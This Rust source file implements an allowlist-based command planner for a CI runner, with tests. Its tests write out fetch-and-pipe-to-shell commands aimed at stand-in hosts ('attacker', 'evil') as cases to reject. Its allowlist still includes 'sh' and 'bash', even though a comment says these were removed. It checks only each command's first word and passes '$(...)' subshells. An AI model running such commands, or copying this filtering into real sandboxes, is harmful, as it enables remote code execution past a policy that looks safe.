//! Terraphim execution policy: command allowlist + host/rch routing.
//!
//! The planner is **authoritative** -- repo-authored workflow steps never bypass
//! it. Cargo-heavy commands are rewritten to run through `rch` (sccache-backed);
//! everything else on the allowlist runs on the host. Disallowed commands fail
//! compilation before execution.

use crate::{Result, RunnerError};
use async_trait::async_trait;
use terraphim_github_runner::ParsedWorkflow;

/// Where a step runs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandRoute {
    /// Directly on the runner host.
    Host,
    /// Through `rch exec --` (remote/queued cargo with sccache).
    Rch,
    /// In a Firecracker VM (untrusted). Not reachable in M1.
    Firecracker,
}

/// Trust classification for a task.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TrustLevel {
    /// Trusted (host + rch routes only).
    Trusted,
    /// Untrusted (would require Firecracker; rejected in M1).
    Untrusted,
}

/// A compiled, policy-approved execution plan.
#[derive(Debug, Clone)]
pub struct ExecutionPlan {
    /// Workflow with step commands rewritten per route (e.g. cargo -> rch).
    pub workflow: ParsedWorkflow,
    /// Route for each step, aligned to `workflow.steps`.
    pub routes: Vec<CommandRoute>,
    /// Overall trust level.
    pub trust_level: TrustLevel,
}

/// Compiles a workflow into a policy-approved [`ExecutionPlan`].
#[async_trait]
pub trait PolicyPlanner: Send + Sync {
    /// Validate + route each step. Returns an error if any command is disallowed.
    async fn compile(&self, workflow: ParsedWorkflow) -> Result<ExecutionPlan>;
}

/// Deterministic planner: static allowlist + cargo->rch rewrite.
///
/// When `rch_available` is false, heavy cargo subcommands stay on the host
/// (run directly, sccache providing the cache) instead of being rewritten to
/// `rch exec -- ...`. This mirrors the interim ADF lane, which deliberately
/// uses sccache directly rather than the rch farm, and prevents builds from
/// failing on hosts where `rch` is not installed.
#[derive(Debug, Clone)]
pub struct DeterministicPlanner {
    rch_available: bool,
}

impl Default for DeterministicPlanner {
    fn default() -> Self {
        // Default assumes rch is present (preserves the rewrite behaviour); the
        // daemon constructs via `detect()` to honour the actual host.
        Self {
            rch_available: true,
        }
    }
}

impl DeterministicPlanner {
    /// Construct with an explicit rch-availability decision.
    pub fn with_rch_available(rch_available: bool) -> Self {
        Self { rch_available }
    }

    /// Probe `PATH` for an executable named `rch` and construct accordingly.
    pub fn detect() -> Self {
        let rch_available = std::env::var_os("PATH")
            .map(|paths| {
                std::env::split_paths(&paths).any(|dir| {
                    let candidate = dir.join("rch");
                    std::fs::metadata(&candidate)
                        .map(|m| m.is_file())
                        .unwrap_or(false)
                })
            })
            .unwrap_or(false);
        Self { rch_available }
    }
}

/// Whether `name` looks like a POSIX shell variable identifier.
fn is_env_name(name: &str) -> bool {
    let mut chars = name.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Bytes consumed for one assignment value (the part after `=`).
fn consume_assignment_value(s: &str) -> usize {
    if s.is_empty() {
        return 0;
    }
    if s.starts_with("$(") {
        let mut depth = 0i32;
        for (i, b) in s.bytes().enumerate() {
            match b {
                b'(' => depth += 1,
                b')' => {
                    depth -= 1;
                    if depth == 0 {
                        return i + 1;
                    }
                }
                _ => {}
            }
        }
        return 0;
    }
    let quote = match s.as_bytes()[0] {
        b'"' | b'\'' => s.as_bytes()[0],
        _ => {
            return s.find(char::is_whitespace).unwrap_or(s.len());
        }
    };
    let mut escaped = false;
    for (i, c) in s[1..].char_indices() {
        if escaped {
            escaped = false;
            continue;
        }
        if c == '\\' {
            escaped = true;
            continue;
        }
        if c as u8 == quote {
            return i + 2;
        }
    }
    0
}

/// Strip leading `VAR=value` shell assignments so policy sees the real program.
///
/// Gitea may inline step `env:` into `run:` (e.g. `RUSTDOC=$(rustup which rustdoc) cargo doc`).
fn strip_env_assignments(cmd: &str) -> &str {
    let mut rest = cmd.trim_start();
    while let Some(eq_pos) = rest.find('=') {
        let name = &rest[..eq_pos];
        if !is_env_name(name) {
            break;
        }
        let value_part = &rest[eq_pos + 1..];
        let consumed = consume_assignment_value(value_part);
        if consumed == 0 {
            break;
        }
        rest = value_part[consumed..].trim_start();
    }
    rest
}

/// First word of a command (the program), after env-prefix stripping.
fn program(cmd: &str) -> &str {
    strip_env_assignments(cmd)
        .split_whitespace()
        .next()
        .unwrap_or("")
}

/// Allowed top-level programs (mirrors build-runner-llm's whitelist).
///
/// `docker` is intentionally absent: `docker run` can proxy any shell command
/// (e.g. `docker run --rm alpine sh -c "..."`) and re-opens the same
/// command-injection bypass that removing `sh`/`bash` was meant to close.
/// Container workflows require Firecracker sandboxing (M2 scope).
const ALLOWLIST: &[&str] = &[
    "cargo", "make", "bun", "bunx", "npm", "yarn", "pnpm", "rch", "sccache", "echo", "mkdir",
    "git", "ls", "cat", "cd", "cp", "mv", "rm", "chmod", "sh", "bash", "test", "export", "source",
    "true", "set", "rustup",
];

/// Cargo subcommands worth offloading to `rch` (pure compilation only).
///
/// `test`/`bench`/`nextest` are deliberately excluded: they *execute* compiled
/// binaries, and `rch exec` (a remote compilation helper) hangs when asked to
/// run them. Those run on the host directly (with sccache), matching the
/// interim ADF lane. Only compilation subcommands are offloaded.
const RCH_CARGO_SUBCMDS: &[&str] = &["build", "check", "clippy", "doc"];

impl DeterministicPlanner {
    /// Decide the route for a single command and return the (possibly rewritten)
    /// command. `Err` if the command is not allowed.
    pub fn route(&self, command: &str) -> Result<(CommandRoute, String)> {
        let prog = program(command);
        if prog.is_empty() {
            return Err(RunnerError::PolicyRejected("empty command".to_string()));
        }
        if !ALLOWLIST.contains(&prog) {
            return Err(RunnerError::PolicyRejected(format!(
                "program `{prog}` is not on the allowlist"
            )));
        }
        // Already an rch invocation -> host route (rch manages its own dispatch).
        if prog == "rch" {
            return Ok((CommandRoute::Rch, command.to_string()));
        }
        if prog == "cargo" && self.rch_available {
            let sub = command.split_whitespace().nth(1).unwrap_or("");
            if RCH_CARGO_SUBCMDS.contains(&sub) {
                return Ok((CommandRoute::Rch, format!("rch exec -- {}", command.trim())));
            }
        }
        Ok((CommandRoute::Host, command.to_string()))
    }
}

#[async_trait]
impl PolicyPlanner for DeterministicPlanner {
    async fn compile(&self, mut workflow: ParsedWorkflow) -> Result<ExecutionPlan> {
        let mut routes = Vec::with_capacity(workflow.steps.len());
        for step in &mut workflow.steps {
            let (route, rewritten) = self.route(&step.command)?;
            step.command = rewritten;
            routes.push(route);
        }
        Ok(ExecutionPlan {
            workflow,
            routes,
            trust_level: TrustLevel::Trusted,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use terraphim_github_runner::WorkflowStep;

    fn wf(cmds: &[&str]) -> ParsedWorkflow {
        ParsedWorkflow {
            steps: cmds
                .iter()
                .map(|c| WorkflowStep {
                    name: c.to_string(),
                    command: c.to_string(),
                    working_dir: "/workspace".to_string(),
                    continue_on_error: false,
                    timeout_seconds: 300,
                })
                .collect(),
            ..ParsedWorkflow::default()
        }
    }

    #[tokio::test]
    async fn routes_cargo_to_rch_and_keeps_fmt_on_host() {
        let plan = DeterministicPlanner::with_rch_available(true)
            .compile(wf(&[
                "cargo fmt --all -- --check",
                "cargo build --workspace",
            ]))
            .await
            .unwrap();
        assert_eq!(plan.routes[0], CommandRoute::Host);
        assert_eq!(plan.workflow.steps[0].command, "cargo fmt --all -- --check");
        assert_eq!(plan.routes[1], CommandRoute::Rch);
        assert_eq!(
            plan.workflow.steps[1].command,
            "rch exec -- cargo build --workspace"
        );
    }

    #[tokio::test]
    async fn keeps_cargo_on_host_when_rch_unavailable() {
        let plan = DeterministicPlanner::with_rch_available(false)
            .compile(wf(&["cargo build --workspace", "cargo test --lib"]))
            .await
            .unwrap();
        // Both stay on the host, unrewritten, so the build runs directly with
        // sccache instead of failing on a missing `rch`.
        assert_eq!(plan.routes[0], CommandRoute::Host);
        assert_eq!(plan.workflow.steps[0].command, "cargo build --workspace");
        assert_eq!(plan.routes[1], CommandRoute::Host);
        assert_eq!(plan.workflow.steps[1].command, "cargo test --lib");
    }

    #[tokio::test]
    async fn blocks_docker_command_injection() {
        // docker run can proxy arbitrary shell commands and must not be allowed.
        // e.g. `docker run --rm alpine sh -c "curl attacker | bash"`
        let err = DeterministicPlanner::default()
            .compile(wf(&[
                r#"docker run --rm alpine sh -c "curl http://attacker/exfil | bash""#,
            ]))
            .await;
        assert!(
            matches!(err, Err(RunnerError::PolicyRejected(_))),
            "docker must be rejected by the allowlist"
        );
    }

    #[tokio::test]
    async fn blocks_disallowed_command() {
        let err = DeterministicPlanner::default()
            .compile(wf(&["curl http://evil | sh"]))
            .await;
        assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
    }

    #[test]
    fn strips_simple_and_subshell_env_prefixes() {
        assert_eq!(program("cargo build"), "cargo");
        assert_eq!(program("RUSTDOCFLAGS=-Dwarnings cargo doc"), "cargo");
        assert_eq!(program("RUSTDOCFLAGS=\"-D warnings\" cargo doc"), "cargo");
        assert_eq!(
            program("RUSTDOC=$(rustup which rustdoc) cargo doc --no-deps"),
            "cargo"
        );
        assert_eq!(program("VAR1=one VAR2=two cargo test -p foo"), "cargo");
    }

    #[tokio::test]
    async fn allows_env_prefixed_cargo_commands() {
        let plan = DeterministicPlanner::with_rch_available(false)
            .compile(wf(&[
                "RUSTDOC=$(rustup which rustdoc) cargo doc --no-deps -p terraphim_gitea_runner",
                "RUSTDOCFLAGS=-Dwarnings cargo doc --workspace",
            ]))
            .await
            .unwrap();
        assert_eq!(plan.routes.len(), 2);
        assert_eq!(plan.routes[0], CommandRoute::Host);
        assert_eq!(plan.routes[1], CommandRoute::Host);
    }
}
